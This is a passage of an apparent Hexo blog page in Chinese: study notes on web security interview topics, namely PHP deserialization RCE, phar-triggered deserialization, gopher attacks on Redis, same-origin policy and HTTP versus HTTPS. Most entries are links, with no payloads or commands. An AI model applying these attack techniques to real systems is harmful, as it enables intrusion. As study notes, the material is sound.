+<h5 id="通过反序列化进行rce"><a href="#通过反序列化进行rce" class="headerlink" title="通过反序列化进行rce"></a>通过反序列化进行rce</h5><p>allow_url_include得打开</p>
+<p><a href="https://www.freebuf.com/vuls/80293.html" target="_blank" rel="noopener">rce</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html" target="_blank" rel="noopener">joomla远程代码执行漏洞分析</a></p>
+<h5 id="phar伪协议触发php反序列化"><a href="#phar伪协议触发php反序列化" class="headerlink" title="phar伪协议触发php反序列化"></a>phar伪协议触发php反序列化</h5><p><a href="https://www.anquanke.com/post/id/159206#h3-11" target="_blank" rel="noopener">详解</a></p>
+<h3 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h3><h5 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h5><p>* 浏览器的同源策略，限制了来自不同元的‘’document‘’或脚本，对当前的‘’document‘’读取或设置某些属性。</p>
+<p>* cookie的混乱使用</p>
+<h5 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h5><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。允许用户使用层叠结构的菜单与文件，以发现和检索信息，它拥有世界上最大、最神奇的编目</p>
+<p>gopher协议攻击redis sql注入</p>
+<h5 id="http与https"><a href="#http与https" class="headerlink" title="http与https"></a>http与https</h5><p>https协议需要到ca申请证书，一般免费证书很少，需要交费。</p>
+<p>http<strong>是超文本传输协议</strong>，信息是明文传输，https 则是<strong>具有安全性的ssl加密传输协议</strong>。ssl 主要用于WEB的安全传输协议.</p>
+<p>http和https使用的是完全不同的连接方式用的端口也不一样，前者是<strong>80</strong>，后者是<strong>443</strong>。</p>
+<p>http的连接很简单，是无状态的。</p>
+<p>HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，要比http协议安全.</p>
+<p><a href="https://zhuanlan.zhihu.com/p/26053309" target="_blank" rel="noopener">大致模型</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/12/29/%E6%96%B0%E8%8A%BD%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0/" data-id="ckimv8fz80001fjwdbi4y8ipm"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2019/06/12/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            代码执行和命令执行的一些利用方法
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2010/11/20/%E7%96%AF%E4%BC%A0%E5%85%AD%E5%8E%9F%E5%88%99/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">疯传六原则读后思维导图</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 Ayrain&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Ayrain&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
